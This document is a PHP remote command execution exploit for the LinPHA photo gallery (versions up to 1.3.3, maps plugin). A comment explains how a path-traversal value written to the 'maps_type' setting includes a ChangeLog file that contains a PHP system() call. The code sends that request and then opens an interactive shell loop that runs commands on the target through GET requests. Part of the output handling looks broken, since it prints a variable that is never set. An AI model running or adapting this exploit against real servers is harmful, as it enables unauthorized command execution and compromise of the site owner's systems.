LinPHA <= 1.3.3 (maps plugin) Remote Command Execution Exploit
==============================================================




<?php

/*
	--------------------------------------------------------------
	LinPHA <= 1.3.3 (maps plugin) Remote Command Execution Exploit
	--------------------------------------------------------------
	
	author...: EgiX
	
	link.....: http://linpha.sourceforge.net
	details..: works with magic_quotes_gpc = off

	[-] LFI found by rgod in /plugins/maps/map.main.class.php

	20.	if(!defined(&#039;TOP_DIR&#039;)) { define(&#039;TOP_DIR&#039;,&#039;../&#039;); }
	21.	
	22.	$type = read_config(&#039;maps_type&#039;);
	23.	
	24.	require_once(TOP_DIR."/plugins/maps/$type/$type.class.php"); <== LFI
	25.	require_once(TOP_DIR.&#039;/plugins/maps/geocode.class.php&#039;);
	26.	include_once(TOP_DIR.&#039;/plugins/maps/location.class.php&#039;);

	an attacker could be include an arbitrary local file through the require_once() at
	line 24 cause is possible to modify &#039;maps_type&#039; config value by another script:

	[-] look at /plugins/maps/db_handler.php

	112.	if(@	$_POST[&#039;job&#039;] == "settings") 
	113.	{
	114.	update_config($_POST[&#039;maps_yahoo_id&#039;], &#039;maps_yahoo_id&#039; );
	115.	update_config($_POST[&#039;maps_google_key&#039;], &#039;maps_google_key&#039;);
	116.	update_config($_POST[&#039;maps_type&#039;], &#039;maps_type&#039;);			<== &#039;maps_type&#039; value updating
	117.	update_config($_POST[&#039;maps_display_type&#039;], &#039;maps_display_type&#039;);
	118.	update_config($_POST[&#039;maps_google_ctrl_size&#039;], &#039;maps_google_ctrl_size&#039;);
	119.	update_config($_POST[&#039;maps_default_zoom&#039;], &#039;maps_default_zoom&#039;);
	120.	update_config($_POST[&#039;maps_default_zoom_location&#039;], &#039;maps_default_zoom_location&#039;);
	121.	update_config($_POST[&#039;maps_yahoo_type_control&#039;], &#039;maps_yahoo_type_control&#039;);
	122.	update_config($_POST[&#039;maps_yahoo_pan_control&#039;], &#039;maps_yahoo_pan_control&#039;);
	123.	update_config($_POST[&#039;maps_yahoo_slide_control&#039;], &#039;maps_yahoo_slide_control&#039;); 
	124.	update_config($_POST[&#039;maps_marker_auto_popup&#039;], &#039;maps_marker_auto_popup&#039;); 
	125.	
	126.	header("Location: ".TOP_DIR."/admin.php?page=maps&plugins=1");
	127.	}

	and now we need a file to include...what do you think about ChangeLog?

	[-] ChangeLog file:

	393.	###############################################
	394.	###                                         ###
	395.	###          LinPHA 1.1.0 RELEASE!          ###
	396.	###                                         ###
	397.	###############################################
	398.	
	399.	2006-02-19  bzrudi71 <linpha_AT_tuxpower_DOT_de>
	400.	 * tagged LinPHA linpha_1_1_0 :-)
	401.	
	402.	2006-02-18  flo
	403.	 * fixed linpha vulnerability found on secunia.com
	404.	   + docs/index.php and install/*
	405.	     include($lang) fixed
	406.	   + plugins/log/logger.class.php
	407.	     use htmlspecialchars() before write logger events to database or to text file
	408.	     for example:
	409.	     User <?php echo system($_GET[&#039;cwd&#039;]); ?>: login failed! <== oops! ;)
	410.	     will be replaced by:
	411.	     User <?php echo system($_GET[&#039;cwd&#039;]); ?>: login failed!

*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from ".$host.":80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print "\n+------------------------------------------------------------------------+";
print "\n| LinPHA <= 1.3.3 (maps plugin) Remote Command Execution Exploit by EgiX |";
print "\n| - bug (LFI) found by rgod                                              |";
print "\n+------------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage...:	php $argv[0] host path\n";
	print "\nhost....:	target server (ip/hostname)";
	print "\npath....:	path to Linpha directory\n";
	die();
}

$host	= $argv[1];
$path	= $argv[2];
	
$payload = "job=settings&maps_type=%2E%2E/%2E%2E/ChangeLog%00";
$packet  = "POST {$path}plugins/maps/db_handler.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;
http_send($host, $packet);
	
define(STDIN, fopen("php://stdin", "r"));

while(1)
{
	print "\nlinpha-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet = "GET {$path}maps_view.php?cwd=".urlencode($cmd)." HTTP/1.0\r\n";
		$packet.= "Host: {$host}\r\n";
		$packet.= "Connection: close\r\n\r\n";
		$resp	= http_send($host, $packet);
		if (!ereg("ChangeLog", $resp)) die("\n[-] Exploit failed...probably magic_quotes_gpc = on\n");
		print "\n{$shell[1]}\n";
	}
	else break;
}

?>



